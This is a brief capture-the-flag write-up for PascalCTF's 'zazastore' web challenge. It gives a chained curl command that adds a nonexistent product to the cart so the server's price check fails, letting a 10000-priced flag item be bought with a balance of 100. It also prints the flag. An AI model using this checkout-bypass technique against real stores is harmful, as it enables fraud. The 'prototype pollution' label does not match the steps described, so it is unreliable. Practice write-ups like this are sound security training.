# web - zazastore

```
zazastore

curl -s -c c -X POST -H "Content-Type: application/json" -d "{\"username\":\"a\",\"password\":\"a\"}" https://zazastore.ctf.pascalctf.it/login  >nul && curl -s -b c -c c -X POST -H "Content-Type: application/json" -d "{\"product\":\"RealZa\",\"quantity\":1}" https://zazastore.ctf.pascalctf.it/add-cart  >nul && curl -s -b c -c c -X POST -H "Content-Type: application/json" -d "{\"product\":\"x\",\"quantity\":1}" https://zazastore.ctf.pascalctf.it/add-cart  >nul && curl -s -b c -c c -X POST https://zazastore.ctf.pascalctf.it/checkout  >nul && curl -s -b c https://zazastore.ctf.pascalctf.it/inventory 
```
prototype pollution
got flag item with 10000 while our balance 100
the calculation in server.js shown that if x > 100 = true
so we,
add invalid item cause the calculation from true to false and fetch flag
Flag: 
`pascalCTF{w3_l1v3_f0r_th3_z4z4}`

SOLVED by WannaBeMeButTakJadi

Solved by: yappare